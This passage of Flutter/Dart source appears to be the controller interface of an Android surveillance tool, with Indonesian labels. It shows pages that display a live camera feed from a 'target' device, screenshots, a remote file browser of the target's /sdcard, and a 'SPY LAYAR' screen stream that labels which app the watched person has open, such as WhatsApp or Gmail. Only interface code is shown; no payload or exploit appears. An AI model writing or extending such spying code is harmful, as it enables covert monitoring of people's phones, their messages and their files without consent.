        headers: {"x-auth-token": token},
      );
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['frame'] != null && data['frame'].isNotEmpty) {
          if (mounted) {
            setState(() {
              _currentFrame = data['frame'];
              _isLoading = false;
            });
          }
        }
      }
    } catch (_) {}
  }

  @override
  void dispose() {
    _pollingTimer?.cancel();
    widget.onClose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Stack(
          children: [
            if (_currentFrame.isNotEmpty)
              Center(
                child: RepaintBoundary(
                  child: InteractiveViewer(
                    minScale: 0.5,
                    maxScale: 3.0,
                    child: Image.memory(
                      base64Decode(_currentFrame.split(',').last),
                      fit: BoxFit.contain,
                    ),
                  ),
                ),
              )
            else
              Center(
                child: ComixPanel(
                  bgColor: Colors.white,
                  padding: const EdgeInsets.all(20),
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      const SizedBox(
                          width: 50,
                          height: 50,
                          child: CircularProgressIndicator(
                              color: comixCyan, strokeWidth: 3)),
                      const SizedBox(height: 16),
                      const Text("CONNECTING CAMERA...",
                          style: TextStyle(
                              color: comixInk,
                              fontSize: 11,
                              fontWeight: FontWeight.w900,
                              letterSpacing: 2,
                              fontFamily: 'ShareTechMono')),
                    ],
                  ),
                ),
              ),
            // Top
            Positioned(
              top: 10,
              left: 10,
              right: 10,
              child: Row(
                children: [
                  ComixChip(
                    bgColor: comixRed,
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Container(
                            width: 7,
                            height: 7,
                            decoration: const BoxDecoration(
                                color: Colors.white,
                                shape: BoxShape.circle)),
                        const SizedBox(width: 5),
                        const Text('LIVE',
                            style: TextStyle(
                                color: Colors.white,
                                fontSize: 10,
                                fontWeight: FontWeight.w900,
                                fontFamily: 'Orbitron')),
                      ],
                    ),
                  ),
                  const SizedBox(width: 8),
                  ComixChip(
                    bgColor: comixBlue,
                    child: Text(_currentFacing.toUpperCase(),
                        style: const TextStyle(
                            color: Colors.white,
                            fontSize: 9,
                            fontWeight: FontWeight.w900,
                            fontFamily: 'ShareTechMono')),
                  ),
                  const Spacer(),
                  GestureDetector(
                    onTap: widget.onClose,
                    child: Container(
                      width: 40,
                      height: 40,
                      decoration: BoxDecoration(
                        color: comixRed,
                        borderRadius: BorderRadius.circular(10),
                        border: Border.all(color: comixInk, width: 2.5),
                      ),
                      child: const Icon(Icons.close,
                          color: Colors.white, size: 18),
                    ),
                  ),
                ],
              ),
            ),
            // Switch camera
            Positioned(
              bottom: 40,
              left: 20,
              child: GestureDetector(
                onTap: () {
                  final newFacing =
                      _currentFacing == 'front' ? 'back' : 'front';
                  setState(() {
                    _currentFacing = newFacing;
                    _isLoading = true;
                    _currentFrame = '';
                  });
                  widget.onSwitchCamera(newFacing);
                  _fetchFrame();
                },
                child: Container(
                  width: 52,
                  height: 52,
                  decoration: BoxDecoration(
                    color: comixCyan,
                    shape: BoxShape.circle,
                    border: Border.all(color: comixInk, width: 3),
                    boxShadow: const [
                      BoxShadow(
                          color: comixInk, offset: Offset(3, 3), blurRadius: 0),
                    ],
                  ),
                  child: const Icon(Icons.switch_camera,
                      color: Colors.white, size: 24),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// SCREENSHOT RESULT PAGE — COMIX 3D
// ═══════════════════════════════════════════════════════════════════════════════
class ScreenshotResultPage extends StatelessWidget {
  final String targetModel;
  final String screenshotFrame;
  final String screenshotFacing;
  final VoidCallback onClose;

  const ScreenshotResultPage({
    Key? key,
    required this.targetModel,
    required this.screenshotFrame,
    required this.screenshotFacing,
    required this.onClose,
  }) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black.withOpacity(0.95),
      body: SafeArea(
        child: Stack(
          children: [
            Center(
              child: InteractiveViewer(
                minScale: 0.5,
                maxScale: 3.0,
                child: Image.memory(
                  base64Decode(screenshotFrame.split(',').last),
                  fit: BoxFit.contain,
                  width: MediaQuery.of(context).size.width * 0.9,
                  height: MediaQuery.of(context).size.height * 0.7,
                ),
              ),
            ),
            Positioned(
              top: 10,
              left: 10,
              right: 10,
              child: Row(
                children: [
                  ComixChip(
                    bgColor: comixBlue,
                    child: Text("KAMERA ${screenshotFacing.toUpperCase()}",
                        style: const TextStyle(
                            color: Colors.white,
                            fontSize: 10,
                            fontWeight: FontWeight.w900,
                            fontFamily: 'Orbitron')),
                  ),
                  const Spacer(),
                  GestureDetector(
                    onTap: onClose,
                    child: Container(
                      width: 40,
                      height: 40,
                      decoration: BoxDecoration(
                        color: comixRed,
                        borderRadius: BorderRadius.circular(10),
                        border: Border.all(color: comixInk, width: 2.5),
                      ),
                      child: const Icon(Icons.close,
                          color: Colors.white, size: 18),
                    ),
                  ),
                ],
              ),
            ),
            Positioned(
              bottom: 30,
              left: 0,
              right: 0,
              child: Center(
                child: GestureDetector(
                  onTap: onClose,
                  child: Container(
                    padding: const EdgeInsets.symmetric(
                        horizontal: 24, vertical: 12),
                    decoration: BoxDecoration(
                      color: comixRed,
                      borderRadius: BorderRadius.circular(16),
                      border: Border.all(color: comixInk, width: 3),
                      boxShadow: const [
                        BoxShadow(
                            color: comixInk,
                            offset: Offset(4, 4),
                            blurRadius: 0),
                      ],
                    ),
                    child: const Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Icon(Icons.close, color: Colors.white, size: 18),
                        SizedBox(width: 6),
                        Text('TUTUP',
                            style: TextStyle(
                                color: Colors.white,
                                fontWeight: FontWeight.w900,
                                fontFamily: 'Orbitron',
                                letterSpacing: 1)),
                      ],
                    ),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// FILE MANAGER PAGE — COMIX 3D
// ═══════════════════════════════════════════════════════════════════════════════
class FileManagerFullscreenPage extends StatefulWidget {
  final String targetId;
  final String targetModel;
  final VoidCallback onClose;
  final Future<void> Function(String, {String? extra}) sendCommand;

  const FileManagerFullscreenPage({
    Key? key,
    required this.targetId,
    required this.targetModel,
    required this.onClose,
    required this.sendCommand,
  }) : super(key: key);

  @override
  State<FileManagerFullscreenPage> createState() =>
      _FileManagerFullscreenPageState();
}

class _FileManagerFullscreenPageState extends State<FileManagerFullscreenPage> {
  List<Map<String, dynamic>> _files = [];
  String _currentPath = '/sdcard';
  List<String> _pathStack = [];
  bool _isLoading = true;
  String? _errorMessage;

  @override
  void initState() {
    super.initState();
    _navigateTo(_currentPath);
  }

  void _navigateTo(String path) async {
    setState(() {
      _isLoading = true;
      _errorMessage = null;
      _files = [];
    });
    if (path != _currentPath) _pathStack.add(_currentPath);
    _currentPath = path;
    try {
      await widget.sendCommand('getFiles', extra: path);
      Future.delayed(const Duration(seconds: 3), () {
        if (mounted) setState(() => _isLoading = false);
      });
    } catch (e) {
      setState(() {
        _isLoading = false;
        _errorMessage = 'Gagal memuat folder: $e';
      });
    }
  }

  void _goBack() {
    if (_pathStack.isNotEmpty) {
      final previousPath = _pathStack.removeLast();
      _currentPath = previousPath;
      _navigateTo(previousPath);
    }
  }

  String _formatBytes(int bytes) {
    if (bytes == 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    final i = (log(bytes) / log(k)).floor();
    return '${(bytes / pow(k, i)).toStringAsFixed(1)} ${sizes[i]}';
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: comixBg,
      appBar: AppBar(
        backgroundColor: comixBg,
        elevation: 0,
        automaticallyImplyLeading: false,
        flexibleSpace: Container(
          decoration: const BoxDecoration(
            border: Border(bottom: BorderSide(color: comixInk, width: 3)),
          ),
        ),
        leading: Padding(
          padding: const EdgeInsets.only(left: 8),
          child: GestureDetector(
            onTap: widget.onClose,
            child: Container(
              decoration: BoxDecoration(
                color: comixYellow,
                borderRadius: BorderRadius.circular(11),
                border: Border.all(color: comixInk, width: 2.5),
                boxShadow: const [
                  BoxShadow(
                      color: comixInk, offset: Offset(2.5, 2.5), blurRadius: 0),
                ],
              ),
              child:
                  const Icon(Icons.arrow_back_rounded, color: comixInk, size: 20),
            ),
          ),
        ),
        title: const Text('FILE MANAGER',
            style: TextStyle(
                color: comixInk,
                fontWeight: FontWeight.w900,
                fontFamily: 'Orbitron',
                fontSize: 14)),
        centerTitle: true,
        actions: [
          if (_pathStack.isNotEmpty)
            Padding(
              padding: const EdgeInsets.only(right: 10),
              child: GestureDetector(
                onTap: _goBack,
                child: Container(
                  width: 40,
                  height: 40,
                  decoration: BoxDecoration(
                    color: comixBlue,
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: comixInk, width: 2.5),
                  ),
                  child: const Icon(Icons.arrow_upward_rounded,
                      color: Colors.white, size: 18),
                ),
              ),
            ),
        ],
      ),
      body: Stack(
        children: [
          Positioned.fill(
            child: IgnorePointer(
                child: CustomPaint(painter: ComixHalftonePainter())),
          ),
          Column(
            children: [
              Padding(
                padding: const EdgeInsets.all(14),
                child: ComixPanel(
                  bgColor: comixYellow.withOpacity(0.5),
                  shadowOffset: 3,
                  borderWidth: 2.5,
                  radius: const BorderRadius.all(Radius.circular(12)),
                  padding:
                      const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
                  child: Row(
                    children: [
                      const Icon(Icons.folder, color: comixInk, size: 18),
                      const SizedBox(width: 8),
                      Expanded(
                        child: Text(_currentPath,
                            style: const TextStyle(
                                color: comixInk,
                                fontSize: 11,
                                fontWeight: FontWeight.w900,
                                fontFamily: 'ShareTechMono'),
                            overflow: TextOverflow.ellipsis),
                      ),
                    ],
                  ),
                ),
              ),
              Expanded(
                child: _isLoading
                    ? Center(
                        child: Column(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            const SizedBox(
                                width: 50,
                                height: 50,
                                child: CircularProgressIndicator(
                                    color: comixBlue, strokeWidth: 3)),
                            const SizedBox(height: 16),
                            const Text('Loading files...',
                                style: TextStyle(
                                    color: comixTextSub,
                                    fontSize: 12,
                                    fontWeight: FontWeight.w700,
                                    fontFamily: 'ShareTechMono')),
                          ],
                        ),
                      )
                    : _errorMessage != null
                        ? Center(
                            child: ComixPanel(
                              bgColor: Colors.white,
                              padding: const EdgeInsets.all(20),
                              child: Column(
                                mainAxisSize: MainAxisSize.min,
                                children: [
                                  const Icon(Icons.error_outline,
                                      color: comixRed, size: 48),
                                  const SizedBox(height: 16),
                                  Text(_errorMessage!,
                                      textAlign: TextAlign.center,
                                      style: const TextStyle(
                                          color: comixInk,
                                          fontSize: 12,
                                          fontWeight: FontWeight.w700,
                                          fontFamily: 'ShareTechMono')),
                                  const SizedBox(height: 16),
                                  _ComixGradBtn(
                                    label: 'RETRY',
                                    icon: Icons.refresh_rounded,
                                    color: comixBlue,
                                    onTap: () => _navigateTo(_currentPath),
                                  ),
                                ],
                              ),
                            ),
                          )
                        : _files.isEmpty
                            ? Center(
                                child: ComixPanel(
                                  bgColor: Colors.white,
                                  padding: const EdgeInsets.all(20),
                                  child: const Column(
                                    mainAxisSize: MainAxisSize.min,
                                    children: [
                                      Icon(Icons.folder_open,
                                          color: comixInk, size: 48),
                                      SizedBox(height: 16),
                                      Text('Folder kosong',
                                          style: TextStyle(
                                              color: comixInk,
                                              fontSize: 12,
                                              fontWeight: FontWeight.w900,
                                              fontFamily: 'Orbitron')),
                                    ],
                                  ),
                                ),
                              )
                            : ListView.builder(
                                padding: const EdgeInsets.all(14),
                                itemCount: _files.length,
                                itemBuilder: (context, index) {
                                  final file = _files[index];
                                  final isDir = file['isDir'] == true;
                                  final name = file['name'] ?? 'Unknown';
                                  final path = file['path'] ?? '';
                                  final size = file['size'] ?? 0;
                                  return Padding(
                                    padding: const EdgeInsets.only(bottom: 10),
                                    child: ComixPanel(
                                      bgColor: Colors.white,
                                      shadowOffset: 3,
                                      borderWidth: 2.5,
                                      radius: const BorderRadius.all(
                                          Radius.circular(12)),
                                      padding: const EdgeInsets.all(10),
                                      child: Row(
                                        children: [
                                          Container(
                                            width: 42,
                                            height: 42,
                                            decoration: BoxDecoration(
                                              color: isDir
                                                  ? comixBlue
                                                  : comixOrange,
                                              borderRadius:
                                                  BorderRadius.circular(10),
                                              border: Border.all(
                                                  color: comixInk, width: 2),
                                            ),
                                            child: Icon(
                                              isDir
                                                  ? Icons.folder
                                                  : Icons
                                                      .insert_drive_file,
                                              color: Colors.white,
                                              size: 20,
                                            ),
                                          ),
                                          const SizedBox(width: 12),
                                          Expanded(
                                            child: Column(
                                              crossAxisAlignment:
                                                  CrossAxisAlignment.start,
                                              children: [
                                                Text(name,
                                                    style: const TextStyle(
                                                        color: comixInk,
                                                        fontWeight:
                                                            FontWeight.w900,
                                                        fontSize: 12),
                                                    overflow: TextOverflow
                                                        .ellipsis),
                                                Text(
                                                    isDir
                                                        ? 'Folder'
                                                        : _formatBytes(size),
                                                    style: const TextStyle(
                                                        color: comixTextSub,
                                                        fontSize: 10,
                                                        fontWeight:
                                                            FontWeight.w700,
                                                        fontFamily:
                                                            'ShareTechMono')),
                                              ],
                                            ),
                                          ),
                                          GestureDetector(
                                            onTap: () {
                                              if (isDir) _navigateTo(path);
                                            },
                                            child: Container(
                                              width: 32,
                                              height: 32,
                                              decoration: BoxDecoration(
                                                color: isDir
                                                    ? comixBlue
                                                    : comixGreen,
                                                shape: BoxShape.circle,
                                                border: Border.all(
                                                    color: comixInk, width: 2),
                                              ),
                                              child: Icon(
                                                isDir
                                                    ? Icons
                                                        .arrow_forward_rounded
                                                    : Icons.download_rounded,
                                                color: Colors.white,
                                                size: 16,
                                              ),
                                            ),
                                          ),
                                        ],
                                      ),
                                    ),
                                  );
                                },
                              ),
              ),
            ],
          ),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// LIVE SCREEN PAGE — COMIX 3D
// ═══════════════════════════════════════════════════════════════════════════════
class LiveScreenPage extends StatefulWidget {
  final String targetModel;
  final Stream<Map<String, dynamic>> frameStream;
  final VoidCallback onClose;

  const LiveScreenPage({
    Key? key,
    required this.targetModel,
    required this.frameStream,
    required this.onClose,
  }) : super(key: key);

  @override
  State<LiveScreenPage> createState() => _LiveScreenPageState();
}

class _LiveScreenPageState extends State<LiveScreenPage> {
  String _frame = '';
  String _currentApp = '';
  bool _isLoading = true;
  int _fps = 0;
  int _frameCount = 0;
  DateTime _lastFps = DateTime.now();

  static const Map<String, String> _appNames = {
    'com.whatsapp': 'WhatsApp',
    'com.instagram.android': 'Instagram',
    'com.facebook.katana': 'Facebook',
    'com.google.android.youtube': 'YouTube',
    'com.tiktok.musical.ly': 'TikTok',
    'com.spotify.music': 'Spotify',
    'com.telegram.messenger': 'Telegram',
    'com.google.android.gm': 'Gmail',
    'com.android.settings': 'Pengaturan',
    'com.android.chrome': 'Chrome',
    'com.shopee.id': 'Shopee',
    'com.gojek.app': 'Gojek',
  };

  String _resolveAppName(String pkg) {
    if (pkg.isEmpty) return '';
    return _appNames[pkg] ?? pkg.split('.').last.replaceAll('_', ' ');
  }

  @override
  void initState() {
    super.initState();
    widget.frameStream.listen((data) {
      if (!mounted) return;
      _frameCount++;
      final now = DateTime.now();
      final diff = now.difference(_lastFps).inMilliseconds;
      if (diff >= 1000) {
        setState(() {
          _fps = (_frameCount * 1000 / diff).round();
          _frameCount = 0;
          _lastFps = now;
        });
      }
      setState(() {
        _frame = data['frame'] as String? ?? '';
        _currentApp = data['app'] as String? ?? _currentApp;
        _isLoading = false;
      });
    });
  }

  @override
  Widget build(BuildContext context) {
    final String appLabel = _resolveAppName(_currentApp);

    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        fit: StackFit.expand,
        children: [
          if (_frame.isNotEmpty)
            RepaintBoundary(
              child: InteractiveViewer(
                minScale: 0.5,
                maxScale: 4.0,
                child: Image.memory(
                  base64Decode(_frame.split(',').last),
                  fit: BoxFit.contain,
                  gaplessPlayback: true,
                ),
              ),
            )
          else
            Center(
              child: ComixPanel(
                bgColor: Colors.white,
                padding: const EdgeInsets.all(20),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    const SizedBox(
                        width: 50,
                        height: 50,
                        child: CircularProgressIndicator(
                            color: comixPurple, strokeWidth: 3)),
                    const SizedBox(height: 14),
                    const Text('MENGHUBUNGKAN LAYAR...',
                        style: TextStyle(
                            color: comixInk,
                            fontWeight: FontWeight.w900,
                            fontSize: 11,
                            fontFamily: 'ShareTechMono',
                            letterSpacing: 2)),
                  ],
                ),
              ),
            ),
          Positioned(
            top: 0, left: 0, right: 0,
            child: Container(
              padding: EdgeInsets.only(
                top: MediaQuery.of(context).padding.top + 12,
                left: 14, right: 14, bottom: 16,
              ),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [Colors.black.withOpacity(0.8), Colors.transparent],
                ),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      ComixChip(
                        bgColor: comixRed,
                        child: Row(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            Container(
                                width: 7,
                                height: 7,
                                decoration: const BoxDecoration(
                                    color: Colors.white,
                                    shape: BoxShape.circle)),
                            const SizedBox(width: 5),
                            const Text('LIVE',
                                style: TextStyle(
                                    color: Colors.white,
                                    fontSize: 10,
                                    fontWeight: FontWeight.w900,
                                    fontFamily: 'Orbitron')),
                          ],
                        ),
                      ),
                      const SizedBox(width: 8),
                      ComixChip(
                        bgColor: comixPurple,
                        child: const Text('SPY LAYAR',
                            style: TextStyle(
                                color: Colors.white,
                                fontSize: 9,
                                fontWeight: FontWeight.w900,
                                fontFamily: 'ShareTechMono')),
                      ),
                      const SizedBox(width: 8),
                      ComixChip(
                        bgColor: comixBlue,
                        child: Text('$_fps FPS',
                            style: const TextStyle(
                                color: Colors.white,
                                fontSize: 9,
                                fontWeight: FontWeight.w900,
                                fontFamily: 'ShareTechMono')),
                      ),
                      const Spacer(),
                      GestureDetector(
                        onTap: widget.onClose,
                        child: Container(
                          width: 40,
                          height: 40,
                          decoration: BoxDecoration(
                            color: comixRed,
                            borderRadius: BorderRadius.circular(10),
                            border: Border.all(color: comixInk, width: 2.5),
                          ),
                          child: const Icon(Icons.close,
                              color: Colors.white, size: 18),
                        ),
                      ),
                    ],
                  ),
                  if (appLabel.isNotEmpty) ...[
                    const SizedBox(height: 10),
                    ComixChip(
                      bgColor: comixPurple,
                      child: Row(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          const Icon(Icons.apps_rounded,
                              color: Colors.white, size: 12),
                          const SizedBox(width: 6),
                          Text('SEDANG BUKA: $appLabel',
                              style: const TextStyle(
                                  color: Colors.white,
                                  fontSize: 10,
                                  fontWeight: FontWeight.w900,
                                  fontFamily: 'ShareTechMono')),
                        ],
                      ),
                    ),
                  ],
                ],
              ),
            ),
          ),
          Positioned(
            bottom: 0, left: 0, right: 0,
            child: Container(
              padding: EdgeInsets.only(
                bottom: MediaQuery.of(context).padding.bottom + 20,
                top: 24, left: 28, right: 28,
              ),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.bottomCenter,
                  end: Alignment.topCenter,
                  colors: [Colors.black.withOpacity(0.85), Colors.transparent],
                ),
              ),
              child: Center(
                child: GestureDetector(
                  onTap: widget.onClose,
                  child: Container(
                    height: 52,
                    padding: const EdgeInsets.symmetric(horizontal: 24),
                    decoration: BoxDecoration(
                      color: comixRed,
                      borderRadius: BorderRadius.circular(16),
                      border: Border.all(color: comixInk, width: 3),
                      boxShadow: const [
                        BoxShadow(
                            color: comixInk,
                            offset: Offset(4, 4),
                            blurRadius: 0),
                      ],
                    ),
                    child: const Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Icon(Icons.stop_circle_rounded,
                            color: Colors.white, size: 20),
                        SizedBox(width: 8),
                        Text('STOP',
                            style: TextStyle(
                                color: Colors.white,
                                fontWeight: FontWeight.w900,
                                fontFamily: 'Orbitron',
                                letterSpacing: 1.5,
                                fontSize: 13)),
                      ],
                    ),
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// LEGACY COMPAT WIDGETS
// ═══════════════════════════════════════════════════════════════════════════════
class GlassButton extends StatelessWidget {
  final String label;
  final IconData? icon;
  final VoidCallback onTap;
  final Color? accentColor;
  final double height;
  final double fontSize;
  GlassButton({
    super.key,
    required this.label,
    this.icon,
    required this.onTap,
    this.accentColor,
    this.height = 52,
    this.fontSize = 15,
  });

  @override
  Widget build(BuildContext context) {
    final Color c = accentColor ?? comixBlue;
    return GestureDetector(
      onTap: onTap,
      child: Container(
        width: double.infinity,
        height: height,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          color: c,
          border: Border.all(color: comixInk, width: 3),
          boxShadow: const [
            BoxShadow(color: comixInk, offset: Offset(4, 4), blurRadius: 0),
          ],
        ),
        child: Center(
          child: Row(
            mainAxisSize: MainAxisSize.min,
            children: [
              if (icon != null) ...[
                Icon(icon, color: Colors.white, size: fontSize + 4),
                const SizedBox(width: 8),
              ],
              Text(label,
                  style: TextStyle(
                      color: Colors.white,
                      fontSize: fontSize,
                      fontWeight: FontWeight.w900,
                      letterSpacing: 1.1)),
            ],
          ),
        ),
      ),
    );
  }
}

class GlassCard extends StatelessWidget {
  final Widget child;
  final EdgeInsetsGeometry? padding;
  final double radius;
  final Color? accent;
  const GlassCard({
    super.key,
    required this.child,
    this.padding,
    this.radius = 18,
    this.accent,
  });

  @override
  Widget build(BuildContext context) {
    final Color c = accent ?? comixBlue;
    return Container(
      padding: padding ?? const EdgeInsets.all(16),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(radius),
        color: c,
        border: Border.all(color: comixInk, width: 3),
        boxShadow: const [
          BoxShadow(color: comixInk, offset: Offset(4, 4), blurRadius: 0),
        ],
      ),
      child: child,
    );
  }
}